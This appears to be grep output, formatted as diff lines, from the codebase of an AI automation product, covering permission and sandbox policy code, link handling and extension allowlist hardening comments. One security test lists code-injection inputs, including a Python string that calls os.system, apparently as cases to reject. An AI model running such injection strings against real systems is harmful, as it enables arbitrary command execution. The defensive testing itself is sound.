+./apps/desktop/src/utils/permissions.ts:67:    return permissions.some((permission) => this.hasPermission(role, permission));
+./apps/cli/src/config.rs:382:        // (auth.json, mcp-oauth.json, permissions.toml) all chmod 0o600 after
+./apps/desktop/src/utils/navigation.ts:13:      window.open(url, '_blank', 'noopener,noreferrer');
+./apps/desktop/src/utils/navigation.ts:16:    window.open(url, '_blank', 'noopener,noreferrer');
+./apps/desktop/src/lib/tauri-web/shell.ts:3:    window.open(url, '_blank', 'noopener,noreferrer');
+./apps/desktop/src/components/Layout/UserProfile.tsx:259:                handleAction(() => window.open('https://docs.agiworkforce.com', '_blank'))
+./apps/desktop/src-tauri/src/core/agi/executors/tests/database_executor_tests.rs:267:    fn test_validate_query_exec() {
+./apps/desktop/src/hooks/useCreditRefresh.ts:99:                    window.open('https://agiworkforce.com/pricing', '_blank');
+./apps/desktop/src/hooks/useCreditRefresh.ts:197:                  window.open('https://agiworkforce.com/pricing', '_blank');
+./apps/desktop/src/components/Research/SourceCard.tsx:118:      window.open(source.url, '_blank', 'noopener,noreferrer');
+./apps/desktop/src-tauri/src/core/agi/tests/security_tests.rs:328:            "exec('__import__(\"os\").system(\"evil\")')",
+./apps/desktop/src-tauri/src/core/agi/tests/security_tests.rs:329:            "eval('malicious code')",
+./apps/desktop/src/__tests__/components/ReactPreview.test.ts:12:    expect(document).not.toContain('new Function');
+./apps/desktop/src/components/Settings/tabs/General/index.tsx:278:          <Suspense fallback={<Fallback label="Loading automation permissions..." />}>
+./apps/desktop/src/components/Settings/tabs/Privacy/index.tsx:406:        <Suspense fallback={<Fallback label="Loading filesystem permissions..." />}>
+./apps/desktop/src/components/Settings/ComputerUseSettings.tsx:206:    const allowed = permissions.filter((p) => p.status === 'allowed');
+./apps/desktop/src/components/Settings/ComputerUseSettings.tsx:207:    const denied = permissions.filter((p) => p.status === 'denied');
+./apps/desktop/src/components/Settings/ComputerUseSettings.tsx:208:    const ask = permissions.filter((p) => p.status === 'ask_every_time');
+./apps/desktop/src/components/Settings/ComputerUseSettings.tsx:638:            {permissions.length === 0 && (
+./apps/cli/src/tui/app.rs:729:                    additional_permissions: ev.additional_permissions.clone(),
+./apps/cli/src/tui/app.rs:768:                    permissions: ev.permissions.clone(),
+./apps/cli/src/tui/app.rs:1557:                    app.config.permissions.sandbox_policy.get(),
+./apps/cli/src/tui/app.rs:1571:                let sandbox_policy = app.config.permissions.sandbox_policy.get().clone();
+./apps/cli/src/tui/app.rs:2386:                    let policy = self.config.permissions.sandbox_policy.get().clone();
+./apps/cli/src/tui/app.rs:2467:                                self.config.permissions.windows_sandbox_mode,
+./apps/cli/src/tui/app.rs:2741:                    Some(self.config.permissions.approval_policy.value());
+./apps/cli/src/tui/app.rs:2743:                    .set_approval_policy(self.config.permissions.approval_policy.value());
+./apps/cli/src/tui/app.rs:2771:                    Some(self.config.permissions.sandbox_policy.get().clone());
+./apps/cli/src/tui/app.rs:2792:                        let sandbox_policy = self.config.permissions.sandbox_policy.get().clone();
+./apps/cli/src/tui/app.rs:4793:            app.config.permissions.approval_policy.value(),
+./apps/cli/src/tui/app.rs:4902:            app.config.permissions.approval_policy.value(),
+./apps/cli/src/tui/app.rs:4979:            app.config.permissions.approval_policy.value(),
+./apps/cli/src/tui/app/config.rs:86:            && let Err(err) = config.permissions.approval_policy.set(*policy)
+./apps/cli/src/tui/app/config.rs:94:            && let Err(err) = config.permissions.sandbox_policy.set(policy.clone())
+./apps/cli/src/tui/app/config.rs:115:        if let Err(err) = config.permissions.approval_policy.set(policy) {
+./apps/cli/src/tui/app/config.rs:132:        if let Err(err) = config.permissions.sandbox_policy.set(policy) {
+./apps/cli/src/tui/app/config.rs:309:                .set_approval_policy(self.config.permissions.approval_policy.value());
+./apps/cli/src/tui/app/config.rs:314:                .set_sandbox_policy(self.config.permissions.sandbox_policy.get().clone())
+./apps/web/features/billing/pages/BillingDashboard.tsx:246:      window.open(url, '_blank', 'noopener,noreferrer');
+./apps/desktop/src/components/UnifiedAgenticChat/index.tsx:171:  while ((match = mentionPattern.exec(content)) !== null) {
+./apps/desktop/src/components/UnifiedAgenticChat/MessageBubble/MessageBubble.tsx:125:    const match = regex.exec(content);
+./apps/desktop/src/components/UnifiedAgenticChat/MessageBubble/MessageContent.tsx:110:    while ((match = regex.exec(message.content)) !== null) {
+./apps/desktop/src/components/UnifiedAgenticChat/MessageBubble/MessageContent.tsx:218:              const match = /language-(\w+)/.exec(className || '');
+./apps/desktop/src/components/UnifiedAgenticChat/MessageBubble/MessageContent.tsx:226:                const titleMatch = /title="([^"]*)"/.exec(className || '');
+./apps/cli/src/tui/chatwidget.rs:1154:            self.config.permissions.approval_policy =
+./apps/cli/src/tui/chatwidget.rs:1164:            self.config.permissions.sandbox_policy =
+./apps/cli/src/tui/chatwidget.rs:3550:            approval_policy: self.config.permissions.approval_policy.value(),
+./apps/cli/src/tui/chatwidget.rs:3552:            sandbox_policy: self.config.permissions.sandbox_policy.get().clone(),
+./apps/cli/src/tui/chatwidget.rs:5281:        let current_approval = self.config.permissions.approval_policy.value();
+./apps/cli/src/tui/chatwidget.rs:5282:        let current_sandbox = self.config.permissions.sandbox_policy.get();
+./apps/cli/src/tui/chatwidget.rs:5587:            self.config.permissions.sandbox_policy.get(),
+./apps/cli/src/tui/chatwidget.rs:5705:            .unwrap_or_else(|| describe_policy(self.config.permissions.sandbox_policy.get()));
+./apps/cli/src/tui/chatwidget.rs:6076:        if let Err(err) = self.config.permissions.approval_policy.set(policy) {
+./apps/cli/src/tui/chatwidget.rs:6084:        self.config.permissions.sandbox_policy.set(policy)?;
+./apps/cli/src/tui/chatwidget.rs:6090:        self.config.permissions.windows_sandbox_mode = mode;
+./apps/desktop/src/components/UnifiedAgenticChat/ShareCardDialog.tsx:55:    window.open(
+./apps/desktop/src/components/UnifiedAgenticChat/ShareCardDialog.tsx:65:    window.open(
+./apps/desktop/src/components/UnifiedAgenticChat/ShareCardDialog.tsx:75:    window.open(
+./apps/web/features/pages/BlogList.tsx:407:    window.open(`/blog/${post.slug}`, '_blank');
+./apps/web/features/pages/BlogList.tsx:509:    window.open(`/blog/${post.slug}`, '_blank');
+./apps/web/features/pages/HelpCenter.tsx:371:                onClick={() => window.open('https://community.agiworkforce.com', '_blank')}
+./apps/web/features/pages/HelpCenter.tsx:379:                onClick={() => window.open('https://discord.gg/agiworkforce', '_blank')}
+./apps/web/features/pages/HelpCenter.tsx:403:      window.open(category.href, '_blank');
+./apps/desktop/src/components/UnifiedAgenticChat/MessageBubble/ThinkingMessageBlock.tsx:127:                  const match = /language-(\w+)/.exec(className || '');
+./apps/web/features/teams/components/TeamSettingsPanel.tsx:266:                {permissions.map((perm) => (
+./apps/desktop/src/components/UnifiedAgenticChat/SourcesFooter.tsx:31:    while ((match = regex.exec(content)) !== null) {
+./apps/cli/src/tui/chatwidget/tests.rs:466:        chat.config_ref().permissions.approval_policy.value(),
+./apps/cli/src/tui/chatwidget/tests.rs:470:        chat.config_ref().permissions.sandbox_policy.get(),
+./apps/cli/src/tui/chatwidget/tests.rs:3766:fn begin_exec(chat: &mut ChatWidget, call_id: &str, raw_cmd: &str) -> ExecCommandBeginEvent {
+./apps/cli/src/tui/chatwidget/tests.rs:3770:fn end_exec(
+./apps/cli/src/tui/chatwidget/tests.rs:4190:    begin_exec(&mut chat, "call-1", "echo hi");
+./apps/cli/src/tui/chatwidget/tests.rs:5241:    let begin = begin_exec(&mut chat, "call-1", "echo done");
+./apps/cli/src/tui/chatwidget/tests.rs:5247:    end_exec(&mut chat, begin, "done", "", 0);
+./apps/cli/src/tui/chatwidget/tests.rs:5271:    let begin = begin_exec(&mut chat, "call-2", "false");
+./apps/cli/src/tui/chatwidget/tests.rs:5276:    end_exec(&mut chat, begin, "", "Bloop", 2);
+./apps/cli/src/tui/chatwidget/tests.rs:5339:    begin_exec(&mut chat, "call-exploring", "cat /dev/null");
+./apps/cli/src/tui/chatwidget/tests.rs:5347:    end_exec(&mut chat, orphan, "repro-marker\n", "", 0);
+./apps/cli/src/tui/chatwidget/tests.rs:5376:    let begin_ls = begin_exec(&mut chat, "call-ls", "ls -la");
+./apps/cli/src/tui/chatwidget/tests.rs:5377:    end_exec(&mut chat, begin_ls, "", "", 0);
+./apps/cli/src/tui/chatwidget/tests.rs:5382:    end_exec(&mut chat, orphan, "after\n", "", 0);
+./apps/cli/src/tui/chatwidget/tests.rs:5414:    let begin_ls = begin_exec(&mut chat, "call-ls", "ls -la");
+./apps/cli/src/tui/chatwidget/tests.rs:5415:    let begin_cat = begin_exec(&mut chat, "call-cat", "cat foo.txt");
+./apps/cli/src/tui/chatwidget/tests.rs:5418:    end_exec(&mut chat, begin_ls, "foo.txt\n", "", 0);
+./apps/cli/src/tui/chatwidget/tests.rs:5439:    end_exec(&mut chat, begin_cat, "hello\n", "", 0);
+./apps/cli/src/tui/chatwidget/tests.rs:5458:    end_exec(&mut chat, begin, "echo unified exec startup\n", "", 0);
+./apps/cli/src/tui/chatwidget/tests.rs:5480:    end_exec(&mut chat, begin, "", "", 0);
+./apps/cli/src/tui/chatwidget/tests.rs:5491:    begin_exec(&mut chat, "call-exploring", "cat /dev/null");
+./apps/cli/src/tui/chatwidget/tests.rs:5494:    end_exec(&mut chat, orphan, "repro-marker\n", "", 0);
+./apps/cli/src/tui/chatwidget/tests.rs:5523:    end_exec(&mut chat, begin, "", "", 0);
+./apps/cli/src/tui/chatwidget/tests.rs:6880:    begin_exec(&mut chat, "call-int", "sleep 1");
+./apps/cli/src/tui/chatwidget/tests.rs:9235:    let begin_ls = begin_exec(&mut chat, "call-ls", "ls -la");
+./apps/cli/src/tui/chatwidget/tests.rs:9239:    end_exec(&mut chat, begin_ls, "", "", 0);
+./apps/cli/src/tui/chatwidget/tests.rs:9243:    let begin_cat_foo = begin_exec(&mut chat, "call-cat-foo", "cat foo.txt");
+./apps/cli/src/tui/chatwidget/tests.rs:9247:    end_exec(&mut chat, begin_cat_foo, "hello from foo", "", 0);
+./apps/cli/src/tui/chatwidget/tests.rs:9251:    let begin_sed_range = begin_exec(&mut chat, "call-sed-range", "sed -n 100,200p foo.txt");
+./apps/cli/src/tui/chatwidget/tests.rs:9252:    end_exec(&mut chat, begin_sed_range, "chunk", "", 0);
+./apps/cli/src/tui/chatwidget/tests.rs:9256:    let begin_cat_bar = begin_exec(&mut chat, "call-cat-bar", "cat bar.txt");
+./apps/cli/src/tui/chatwidget/tests.rs:9257:    end_exec(&mut chat, begin_cat_bar, "hello from bar", "", 0);
+./apps/cli/src/tui/chatwidget/tests.rs:9271:    end_exec(&mut chat, begin_ls, "file1\nfile2\n", "", 0);
+./apps/cli/src/tui/chatwidget/tests.rs:9390:    chat.config.permissions.approval_policy =
+./apps/cli/src/tui/chatwidget/tests.rs:9426:    chat.config.permissions.approval_policy =
+./apps/cli/src/tui/chatwidget/tests.rs:10368:    end_exec(&mut chat, begin, "", "", 0);
+./apps/cli/src/tui/status/card.rs:173:                config.permissions.approval_policy.value().to_string(),
+./apps/cli/src/tui/status/card.rs:177:                summarize_sandbox_policy(config.permissions.sandbox_policy.get()),
+./apps/cli/src/tui/status/card.rs:200:        let sandbox = match config.permissions.sandbox_policy.get() {
+./apps/cli/src/tui/status/card.rs:216:        let permissions = if config.permissions.approval_policy.value() == AskForApproval::OnRequest
+./apps/cli/src/tui/status/card.rs:217:            && *config.permissions.sandbox_policy.get()
+./apps/cli/src/tui/status/card.rs:221:        } else if config.permissions.approval_policy.value() == AskForApproval::Never
+./apps/cli/src/tui/status/card.rs:222:            && *config.permissions.sandbox_policy.get() == SandboxPolicy::DangerFullAccess
+./apps/cli/src/tui/status/card.rs:506:        lines.push(formatter.line("Permissions", vec![Span::from(self.permissions.clone())]));
+./apps/desktop/src-tauri/src/core/agi/tests/memory_tests.rs:74:    fn test_memory_retrieval() {
+./apps/web/features/settings/pages/AIConfiguration.tsx:510:            onClick={() => window.open(config.documentation, '_blank')}
+./apps/web/features/settings/pages/AIConfiguration.tsx:515:          <Button variant="outline" size="sm" onClick={() => window.open(config.pricing, '_blank')}>
+./apps/web/features/settings/pages/SettingsPage.tsx:440:        window.open(data.url, '_blank', 'noopener,noreferrer');
+./apps/desktop/src/components/UnifiedAgenticChat/artifacts/HtmlArtifact.tsx:67:    //   artifacts that call eval(), new Function(), or pass strings to setTimeout().
+./apps/web/features/chat/components/Main/MultiAgentChatInterface.tsx:460:  while ((match = mentionRegex.exec(content)) !== null) {
+./apps/web/features/chat/components/Main/ChatTopBar.tsx:122:          onClick={() => window.open('https://docs.mgx.dev/', '_blank')}
+./apps/desktop/src/stores/__tests__/settingsStore.test.ts:115:  it('should normalize terminal sandbox allowlisted domains', () => {
+./apps/cli/src/tui/bottom_pane/approval_overlay.rs:159:                    additional_permissions.as_ref(),
+./apps/cli/src/tui/bottom_pane/approval_overlay.rs:287:            ReviewDecision::Approved | ReviewDecision::ApprovedForSession => permissions.clone(),
+./apps/cli/src/tui/bottom_pane/approval_overlay.rs:298:            let message = if granted_permissions.is_empty() {
+./apps/cli/src/tui/bottom_pane/approval_overlay.rs:703:                } else if additional_permissions.is_some() {
+./apps/cli/src/tui/bottom_pane/approval_overlay.rs:762:    if let Some(file_system) = additional_permissions.file_system.as_ref() {
+./apps/cli/src/tui/bottom_pane/approval_overlay.rs:780:    if let Some(macos) = additional_permissions.macos.as_ref() {
+./apps/cli/src/tui/bottom_pane/approval_overlay.rs:832:    format_additional_permissions_rule(&permissions.clone().into())
+./apps/web/features/connectors/pages/ConnectorsPage.tsx:518:        window.open('https://modelcontextprotocol.io', '_blank', 'noopener,noreferrer');
+./apps/web/features/connectors/pages/ConnectorsPage.tsx:530:      window.open('https://modelcontextprotocol.io', '_blank', 'noopener,noreferrer');
+./apps/web/features/connectors/pages/ConnectorsPage.tsx:619:                  window.open('https://modelcontextprotocol.io', '_blank', 'noopener,noreferrer')
+./apps/web/features/chat/hooks/use-voice-recording.ts:203:        const result = await navigator.permissions.query({
+./apps/desktop/src/stores/settingsStore.ts:134:  /** Domain allowlist passed to the sandbox runtime; empty blocks all network access */
+./apps/desktop/src/components/MCP/McpAppRenderer.tsx:9: * - Never eval() user-provided content
+./apps/web/app/api/webhooks/directory-sync/route.ts:562:  // Map group name to role via exact-match allowlists (env-var driven, not substring)
+./apps/desktop/src/components/MCP/MCPAppDefinitionRenderer.tsx:23: *   - No eval(), no dynamic code execution on the host
+./apps/web/core/ai/tools/unified-tool-registry.ts:315:        reason: `Insufficient permissions. Required: ${tool.requiredPermissions.join(', ')}`,
+./apps/desktop/src/components/Filesystem/FilesystemWorkspace.tsx:186:      toast.error('Failed to delete. The item may be in use or you lack permissions.');
+./apps/web/app/api/llm/v1/audio/transcriptions/route.ts:19: * MIME allowlist a check on actual content rather than the client's claim.
+./apps/web/app/api/llm/v1/audio/transcriptions/route.ts:194:  // B4 fix: default-reject when MIME is missing OR not in the allowlist.
+./apps/extension/src/side_panel/markdown.ts:6:// `<a target="_blank">` would otherwise open with `window.opener` exposed,
+./apps/extension/src/side_panel/markdown.ts:8:// `window.opener.location`. Install an attribute-level hook that hardens
+./apps/extension/src/background.ts:580:// EXT-1, EXT-2 (audit 2026-05-03): allowlist-based sender validation.
+./apps/extension/src/background.ts:587:// We now gate by an explicit user-managed origin allowlist stored under
+./apps/extension/src/background.ts:588:// `chrome.storage.local.agi_site_allowlist`. Extension pages (popup,
+./apps/extension/src/background.ts:599:  .get('agi_site_allowlist')
+./apps/extension/src/background.ts:601:    const list = res['agi_site_allowlist'];
+./apps/extension/src/background.ts:608:  if (area !== 'local' || !changes['agi_site_allowlist']) return;
+./apps/extension/src/background.ts:609:  const next = changes['agi_site_allowlist'].newValue;
+./apps/extension/src/background.ts:636:// commands. Even with an allowlisted origin, a malicious page must
+./apps/extension/src/background.ts:639:// its presence in this set made a future accidental eval()-based handler look
+./apps/extension/src/background.ts:641:// expose an eval() surface. Use EXECUTE_SCRIPT + ALLOWED_SCRIPT_OPERATIONS instead.
+./apps/extension/src/background.ts:648:// allowlisted page (e.g., a compromised LinkedIn / Lever clone) could send
+./apps/extension/src/background.ts:675:  // without this guard, an allowlisted origin could send
+./apps/extension/src/background.ts:683:  // write form fields). Without this guard, an allowlisted origin could send
+./apps/extension/src/background.ts:712:  // EXT-1/2: gate by user-managed allowlist.
+./apps/extension/src/background.ts:714:    logger.warn('Rejected message from non-allowlisted sender', {
+./apps/extension/src/background.ts:721:        'This site is not on your AGI Workforce allowlist. Add it from the extension popup to enable automation here.',
+./apps/extension/src/background.ts:1294:  // these entries, a malicious script running on an allowlisted page could
+./apps/extension/src/background.ts:1307:  // sensitive too. An allowlisted page that calls GET_COOKIES against
+./apps/extension/src/background.ts:1992:  const ipv4Match = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/.exec(h);
+./apps/extension/src/background.ts:2097:// SECURITY (C-1): Gateway URL allowlist. The agi_gateway_url key in
+./apps/extension/src/background.ts:2098:// chrome.storage.local is writable by any allowlisted page. We therefore
+./apps/extension/src/background.ts:2099:// validate the stored value against a strict allowlist rather than trusting the
+./apps/extension/src/background.ts:2189: * allowlist but uses the marketing domain (agiworkforce.com) where /api/me
+./apps/extension/src/background.ts:2387:  // allowlisted origin or via XSS on an allowlisted site) could craft a
+./apps/extension/src/side_panel.ts:1657:  while ((m = re.exec(content)) !== null) {
+./apps/web/app/api/v1/providers/[providerId]/stream/route.ts:63: * 4. providerId validated against ALLOWED_PROVIDER_IDS allowlist.
+./apps/web/app/api/v1/providers/[providerId]/stream/route.ts:98:  // 3. Validate providerId against allowlist
+./apps/extension/src/autofill/linkedin.ts:184:  const match = /(\d+)\s*\//.exec(text);
+./apps/extension/src/content.ts:147:  // Mitigation: only patch console for origins the user explicitly allowlisted
+./apps/extension/src/content.ts:148:  // for automation. Non-allowlisted origins skip the patch entirely.
+./apps/extension/src/content.ts:1062: * SECURITY: new Function() / eval() is not used. Only pre-defined operations are allowed.
+./apps/extension/src/content.ts:1120:  // Any allowlisted origin could invoke these via EXECUTE_SCRIPT, reading or
+./apps/extension/src/content.ts:1125:  // callable by any allowlisted origin. Do NOT re-add these three operations.
+./apps/extension/src/content.ts:1764: * Wraps `patchConsole` with a same-origin allowlist gate. See chrome-SUB-5
+./apps/extension/src/content.ts:1769:  let allowlist: Set<string>;
+./apps/extension/src/content.ts:1771:    const res = await chrome.storage.local.get('agi_site_allowlist');
+./apps/extension/src/content.ts:1772:    const list = (res as Record<string, unknown>)['agi_site_allowlist'];
+./apps/extension/src/content.ts:1773:    allowlist = new Set(Array.isArray(list) ? (list as string[]) : []);
+./apps/extension/src/content.ts:1775:    logger.debug('Could not read agi_site_allowlist for console gating', e);
+./apps/extension/src/content.ts:1779:  if (!allowlist.has(origin)) {
+./apps/extension/src/content.ts:1780:    logger.debug('Console buffering skipped — origin not on user allowlist', { origin });
+./apps/extension/src/content.ts:2040:  // [H9 fix] Validate type is a non-empty string in the known message type allowlist
+./apps/web/app/api/llm/v1/chat/completions/lib/request-processor.ts:545:                message: 'Provider endpoint not in approved egress allowlist',
+./apps/web/features/chat/components/ArtifactBlock.tsx:51:  while ((match = regex.exec(content)) !== null) {
+./apps/web/features/chat/components/ArtifactBlock.tsx:148:              window.open(URL.createObjectURL(blob), '_blank');
+./apps/web/features/chat/utils/artifact-detector.ts:32:  while ((match = regex.exec(markdown)) !== null) {
+./apps/web/features/chat/components/artifacts/ImageAttachmentPreview.tsx:129:                      window.open(attachment.url, '_blank');
+./apps/web/features/chat/components/artifacts/ImageAttachmentPreview.tsx:180:                    onClick={() => window.open(selectedImage.url, '_blank')}
+./apps/extension/__tests__/security-fixes.test.ts:31:describe('C-1 validateGatewayUrl — allowlist enforcement', () => {
+./apps/extension/__tests__/security-fixes.test.ts:173:  it('set is empty — no types bypass allowlist checks', () => {
+./apps/extension/__tests__/security-fixes.test.ts:316:// allowlisted page could send `{ type: 'RUN_PAGE_ACTIONS', tabId: <other> }`
+./apps/extension/__tests__/security-fixes.test.ts:589:// ─── CHROME-SUB-5: console buffering gated by allowlist ──────────────────────
+./apps/extension/__tests__/security-fixes.test.ts:595:describe('CHROME-SUB-5 console buffering gated by user allowlist', () => {
+./apps/extension/__tests__/security-fixes.test.ts:605:  it('initialize() routes through the allowlist-gated wrapper', () => {
+./apps/extension/__tests__/security-fixes.test.ts:609:  it('patchConsoleIfAllowlisted reads agi_site_allowlist from chrome.storage.local', () => {
+./apps/extension/__tests__/security-fixes.test.ts:611:      /async function patchConsoleIfAllowlisted[\s\S]*chrome\.storage\.local\.get\('agi_site_allowlist'/,
+./apps/extension/__tests__/security-fixes.test.ts:615:  it('patchConsoleIfAllowlisted compares window.location.origin against the allowlist set', () => {
+./apps/extension/__tests__/security-fixes.test.ts:619:    expect(slice).toMatch(/allowlist\.has\(/);
+./apps/extension/__tests__/security-fixes.test.ts:627:// mutation guard set, an allowlisted page could send
+./apps/web/features/chat/components/artifacts/ArtifactPreview.tsx:265:    window.open(url, '_blank');
+./apps/web/features/chat/components/messages/MarkdownContent.tsx:16:  const match = /language-(\w+)/.exec(className || '');
+./apps/web/features/chat/components/messages/EnhancedMarkdownRenderer.tsx:62:  const match = /language-(\w+)/.exec(className || '');
+./apps/extension/__tests__/content.test.ts:351:// SET_ATTRIBUTE — security allowlist
+./apps/extension/__tests__/content.test.ts:406:// EXECUTE_SCRIPT — allowlist enforcement
+./apps/extension/__tests__/content.test.ts:409:describe('handleMessage — EXECUTE_SCRIPT allowlist', () => {
+./apps/web/features/chat/stores/artifacts-store.ts:118:  while ((match = regex.exec(content)) !== null) {
+./apps/web/features/chat/components/messages/InlineCitation.tsx:26:        onClick={() => window.open(citation.url, '_blank', 'noopener,noreferrer')}
+./apps/web/features/chat/components/messages/CollaborativeMessageDisplay.tsx:283:                  const match = /language-(\w+)/.exec(className || '');
+./apps/web/features/chat/components/messages/MessageListNew.tsx:72:  const match = /language-(\w+)/.exec(className || '');
